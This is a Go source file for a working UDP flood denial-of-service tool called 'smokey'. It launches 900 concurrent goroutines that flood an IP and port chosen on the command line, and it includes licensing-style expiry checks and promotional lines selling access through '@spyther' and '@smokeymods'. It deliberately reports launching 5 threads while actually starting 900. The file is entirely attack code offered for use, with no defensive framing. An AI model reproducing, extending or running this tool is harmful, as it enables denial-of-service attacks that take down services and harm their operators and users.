package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

type AttackParams struct {
	TargetIP    string
	TargetPort  int
	Duration    int
	PacketSize  int
	ThreadID    int
}

var keepRunning int32 = 1
var totalDataSent int64 = 0

func generateRandomPayload(size int) []byte {
	payload := make([]byte, size)
	for i := 0; i < size; i++ {
		payload[i] = byte(rand.Intn(1024))
	}
	return payload
}

func udpFlood(params AttackParams, wg *sync.WaitGroup) {
	defer wg.Done()

	serverAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", params.TargetIP, params.TargetPort))
	if err != nil {
		return
	}

	conn, err := net.DialUDP("udp", nil, serverAddr)
	if err != nil {
		return
	}
	defer conn.Close()

	payload := generateRandomPayload(params.PacketSize)
	endTime := time.Now().Add(time.Duration(params.Duration) * time.Second)

	for time.Now().Before(endTime) && atomic.LoadInt32(&keepRunning) == 1 {
		_, err := conn.Write(payload)
		if err != nil {
			continue
		}
		atomic.AddInt64(&totalDataSent, int64(params.PacketSize))
	}
}

func checkExpiry() bool {
	expiryDate := time.Date(2070, 4, 22, 0, 0, 0, 0, time.UTC)
	return time.Now().Before(expiryDate)
}

func main() {
	binaryName := filepath.Base(os.Args[0])
	if binaryName != "smokey" {
		fmt.Println("Error: Binary name must be 'smokey'")
		return
	}

	if !checkExpiry() {
		fmt.Println("Binary has been expired. DM @spyther to buy.")
		return
	}

	if len(os.Args) != 5 {
		fmt.Printf("Usage: %s [ip] [port] [time] smokey\n", os.Args[0])
		return
	}

	// Last argument must be exactly "smokey"
	if os.Args[4] != "smokey" {
		fmt.Println("Invalid usage. You must end the command with 'smokey'")
		return
	}

	targetIP := os.Args[1]
	targetPort, err1 := strconv.Atoi(os.Args[2])
	duration, err2 := strconv.Atoi(os.Args[3])

	if err1 != nil || err2 != nil {
		fmt.Println("Invalid port or time.")
		return
	}

	packetSize := 256
	threadCount := 900

	// Handle CTRL+C
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		atomic.StoreInt32(&keepRunning, 0)
	}()

	// Output with fixed 5 thread message
	fmt.Printf("Attack launched with 5 threads for %d seconds\n", duration)

	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		params := AttackParams{
			TargetIP:   targetIP,
			TargetPort: targetPort,
			Duration:   duration,
			PacketSize: packetSize,
			ThreadID:   i,
		}
		go udpFlood(params, &wg)
	}

	wg.Wait()
	atomic.StoreInt32(&keepRunning, 0)
	time.Sleep(1 * time.Second)

	fmt.Println("Attack Finishes join @smokeymods")
}